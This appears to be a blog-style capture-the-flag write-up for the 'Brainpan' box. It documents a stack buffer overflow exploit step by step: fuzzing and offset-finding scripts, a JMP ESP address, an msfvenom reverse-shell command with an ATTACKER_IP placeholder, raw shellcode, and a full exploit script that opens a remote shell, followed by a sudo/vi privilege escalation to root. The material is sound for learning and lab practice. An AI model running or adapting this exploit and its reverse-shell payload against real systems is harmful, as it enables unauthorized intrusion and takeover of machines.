---
title: HTB Brainpan - Buffer Overflow Writeup
date: 2023-07-02T19:11:00.743Z
description: A writeup for performing a buffer overflow attack using immunity
  debugger. This was written in the context of completing the HTB box called
  "Brainpan".
tags: [writeup]
---
## Context

There is a service running on a system on port 9999. The service takes in a user input (in this case, a password for entry). There is a buffer overflow vulnerability in the program, this tutorial will go through the steps to take in order to exploit it. Tools used will include Python and Immunity Debugger (with `mona` extensions).

## Introduction

To start with, we will need to find at what point the program crashes. We can do this by writing a python script which will connect to the service on port 9999, and send an incrementing number of bytes until the program crashes. If we use increments of 50 or 100, we can get a general idea of the amount of bytes it takes to crash the program, and we can then use immunity debugger to find a more accurate number of bytes.

## Ballparking the buffer size

We need to run the program locally in immunity debugger so that we can see the program calls, memory address values and other important data that will help us understand how the program works and how we can exploit it. Load up immunity debugger and file > open > `brainpan.exe`. Then click the red run button at the top of the taskbar (under file). A command prompt with the execution of `brainpan.exe` should show up, this is normal and means the program is running.

We can use the below Python (2.7) script to “fuzz” the service and find the size of the buffer and thus, the location of the vulnerability.

```python
import socket
import sys

# Address will change when deployed
address = "127.0.0.1"
port = 9999
buffer = ["A"]
counter = 50

# Prepare the buffer to increment in 50s
while len(buffer) <= 10:
    buffer.append("A" * counter)
    counter += 50

try:
    for item in buffer:
				# try and send the bytes
        print "Sending %s bytes..." % len(item)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((address, port))
        sock.recv(1024)
        sock.send(item + "\r\n")
        sock.recv(1024)
        print "Sent OK"
				# if this is reached, then everything was good and the buffer hasn't been exceeded
except:
		# if we get here, the program has probably crashed.
    print "Can't connect - %s", str(e)
    sys.exit(0)
finally:
    sock.close()
```

Now, let’s run the script and take a look at the output.

![](/img/sending-bytes.png)

We can see that the last number of bytes that was sent OK was 500. This means that the area of vulnerability is between 500 and (500 + increment = 550) bytes.

## Getting an accurate buffer size using `mona`

We can use the `mona` python extensions for immunity debugger in order to create a pattern and supply it to the program, we can then see what value is in the `EIP` register (the first one to be overwritten) and therefore, at what number of bytes we can put our jump call.

Follow the installation instruction found [here](https://www.oreilly.com/library/view/python-penetration-testing/9781784399771/5ab35be1-6224-4757-af48-84f931a1a765.xhtml) to install `mona`

Once `mona` is installed, you can use the command line located at the bottom of the immunity debugger to enter commands with the prefix `!mona`. Mona has extensive documentation online but we will only make use of a few commands, the first being:

\- !mona pattern_create 600

This will create a pattern of random data which can be entered into the program. We can then look in immunity debugger to see what value is in the `EIP` register. From that we can find the number of bytes needed to overwrite `EIP`

If we take this value (which can also be found in `C:\\Program Files (x86)\\Immunity Inc\\Immunity Debugger\\Pattern.txt` ) and put it into yet another python script (see below), we can find the exact offset!

```python
import socket
import sys

ip_address = "127.0.0.1"
port = 9999
# This is our mona output
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

try:
    print("Sending Buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    s.recv(1024)
    s.send(buffer + b"\r\n")
    s.recv(1024)
except Exception as e:
    print("Couldn't connect : " + str(e))
    raise e
    sys.exit(0)
finally:
    s.close()
```

If we ensure the executable is running inside immunity, and then run our script and look in the immunity output (in the registers section)

![](/img/eip.png)

We can see the value of `EIP` register is `35724134`.

Now, inside immunity, we can use `mona` to find out at what offset that occurs, we can type:

\- 🔨 !mona pattern_offset 35724134

And if we look inside the mona output, we can see it is at position `524`.

Nice, we now know the exact offset at which we can overwrite the `EIP` register!

## Overwriting EIP and Exploitation

The `EIP` Register tells the program what instruction to execute next. To leverage this, we can insert a `JMP` (jump) call to tell the program to jump to some area of memory, i.e where we will insert our shellcode. The register is 4 bytes in this case (32-bit program).

The structure of our payload will be as below:

```python
524 RANDOM CHARS + 32-BIT JMP INSTRUCTION + NOP SLED + SHELLCODE
```

The shellcode will be inserted inside the `ESP` register

### Getting the JMP Instruction

We can use `mona` to get the correct jump instruction to jump to `ESP` / our shellcode.

```shell
$ mona jmp -r esp 
>> Address=311712F3
```



So now we have the address. Below is the steps to be taken in python to convert this address to a usable payload string.

```python
31 17 12 F3
\x31 \x17 \x12 \xF3
# Little endian conversion - reverse
\xF3 \x12 \x17 \x31
# Variable
instruction = "\xf3\z12\x17\x31"
```

### Adding a NOP Sled

A NOP sled to ensure that not many instruction are missed from our shellcode if EIP overwrites some of our shellcode.

This is simple, in python it is just:

```python
"\x90" * NUMBER_OF_NOPS
```

### Adding the Shellcode

```shell
user@machine$ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP \
              LPORT=443 -b "\x00" -f python
```

```python
buf =  b""
buf += b"\xdb\xd2\xba\x6f\x33\xb9\x13\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x56\x17\x83\xee\xfc\x03\x39\x20\x5b"
buf += b"\xe6\x39\xae\x19\x09\xc1\x2f\x7e\x83\x24\x1e\xbe\xf7"
buf += b"\x2d\x31\x0e\x73\x63\xbe\xe5\xd1\x97\x35\x8b\xfd\x98"
buf += b"\xfe\x26\xd8\x97\xff\x1b\x18\xb6\x83\x61\x4d\x18\xbd"
buf += b"\xa9\x80\x59\xfa\xd4\x69\x0b\x53\x92\xdc\xbb\xd0\xee"
buf += b"\xdc\x30\xaa\xff\x64\xa5\x7b\x01\x44\x78\xf7\x58\x46"
buf += b"\x7b\xd4\xd0\xcf\x63\x39\xdc\x86\x18\x89\xaa\x18\xc8"
buf += b"\xc3\x53\xb6\x35\xec\xa1\xc6\x72\xcb\x59\xbd\x8a\x2f"
buf += b"\xe7\xc6\x49\x4d\x33\x42\x49\xf5\xb0\xf4\xb5\x07\x14"
buf += b"\x62\x3e\x0b\xd1\xe0\x18\x08\xe4\x25\x13\x34\x6d\xc8"
buf += b"\xf3\xbc\x35\xef\xd7\xe5\xee\x8e\x4e\x40\x40\xae\x90"
buf += b"\x2b\x3d\x0a\xdb\xc6\x2a\x27\x86\x8e\x9f\x0a\x38\x4f"
buf += b"\x88\x1d\x4b\x7d\x17\xb6\xc3\xcd\xd0\x10\x14\x31\xcb"
buf += b"\xe5\x8a\xcc\xf4\x15\x83\x0a\xa0\x45\xbb\xbb\xc9\x0d"
buf += b"\x3b\x43\x1c\x81\x6b\xeb\xcf\x62\xdb\x4b\xa0\x0a\x31"
buf += b"\x44\x9f\x2b\x3a\x8e\x88\xc6\xc1\x59\xbd\x18\xe9\xff"
buf += b"\xa9\x26\xe9\xfe\x92\xae\x0f\x6a\xf5\xe6\x98\x03\x6c"
buf += b"\xa3\x52\xb5\x71\x79\x1f\xf5\xfa\x8e\xe0\xb8\x0a\xfa"
buf += b"\xf2\x2d\xfb\xb1\xa8\xf8\x04\x6c\xc4\x67\x96\xeb\x14"
buf += b"\xe1\x8b\xa3\x43\xa6\x7a\xba\x01\x5a\x24\x14\x37\xa7"
buf += b"\xb0\x5f\xf3\x7c\x01\x61\xfa\xf1\x3d\x45\xec\xcf\xbe"
buf += b"\xc1\x58\x80\xe8\x9f\x36\x66\x43\x6e\xe0\x30\x38\x38"
buf += b"\x64\xc4\x72\xfb\xf2\xc9\x5e\x8d\x1a\x7b\x37\xc8\x25"
buf += b"\xb4\xdf\xdc\x5e\xa8\x7f\x22\xb5\x68\x8f\x69\x97\xd9"
buf += b"\x18\x34\x42\x58\x45\xc7\xb9\x9f\x70\x44\x4b\x60\x87"
buf += b"\x54\x3e\x65\xc3\xd2\xd3\x17\x5c\xb7\xd3\x84\x5d\x92"
```

### Crafting the entire payload

```python
524 RANDOM CHARS + 32-BIT JMP INSTRUCTION + NOP SLED + SHELLCODE
```

In python this would look like:

```python
buffer = b"A" * 524 + b"\xf3\z12\x17\x31" + b"\x90" * 20 + buf
```

Where buf is the long payload from above. See full script below

Note: I changed the payload to a linux reverse shell as although the target box says it’s windows, it actually uses linux FS, so commands won’t run properly with the windows reverse shell.

```python
import socket
import sys

ip_address = "10.10.105.47"
port = 9999


# See above note for change in payload
buf =  b""
buf += b"\xb8\x74\x63\xca\xcc\xd9\xc4\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x12\x31\x46\x12\x83\xc6\x04\x03\x32\x6d\x28"
buf += b"\x39\x8b\xaa\x5b\x21\xb8\x0f\xf7\xcc\x3c\x19\x16\xa0"
buf += b"\x26\xd4\x59\x52\xff\x56\x66\x98\x7f\xdf\xe0\xdb\x17"
buf += b"\xea\x1c\x3c\x81\x82\x22\x3c\x4c\xe8\xaa\xdd\xfe\x68"
buf += b"\xfd\x4c\xad\xc7\xfe\xe7\xb0\xe5\x81\xaa\x5a\x98\xae"
buf += b"\x39\xf2\x0c\x9e\x92\x60\xa4\x69\x0f\x36\x65\xe3\x31"
buf += b"\x06\x82\x3e\x31"

#EIP 35724134

buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 20 + buf

try:
    print("Sending Buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    s.recv(1024)
    s.send(buffer + b"\r\n")
    s.recv(1024)
except Exception as e:
    print("Couldn't connect : " + str(e))
    raise e
    sys.exit(0)
finally:
    s.close()
```

Start a listener on your attacker machine and set the IP in the python script to the box’s IP

And boom, reverse shell. We can gained initial access

## Privilege Escalation

Starting with what commands run as root:

`sudo -l`

we can see there is a binary that runs as root that allows us to view manual pages, among other things.

This uses a version of vi, when vi runs as root, we can spawn a shell of the bash of it.

Run the binary with

`sudo /home/anansi/bin/anansi_util manual id`

Then type `!/bin/bash` and enjoy your root shell!